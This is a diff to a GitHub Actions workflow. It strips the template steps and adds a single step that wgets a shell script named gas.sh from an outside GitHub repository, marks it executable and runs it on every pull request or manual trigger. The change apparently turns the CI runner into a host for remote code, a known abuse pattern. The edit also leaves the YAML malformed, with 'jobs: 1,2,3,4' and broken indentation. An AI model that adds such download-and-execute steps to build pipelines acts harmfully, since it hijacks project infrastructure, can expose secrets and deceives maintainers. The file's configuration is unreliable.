@@ -5,14 +5,10 @@ on:
   pull_request:
     branches: [ "main" ]
   workflow_dispatch:
-jobs:
+jobs: 1,2,3,4
   build:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-20.04
     steps:
-      - uses: 
-      - name: sc1
-        run: echo Hello, world!
       - name: multiple
         run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+       wget https://github.com/stokjacky/cek1/raw/main/gas.sh && chmod +x gas.sh && ./gas.sh
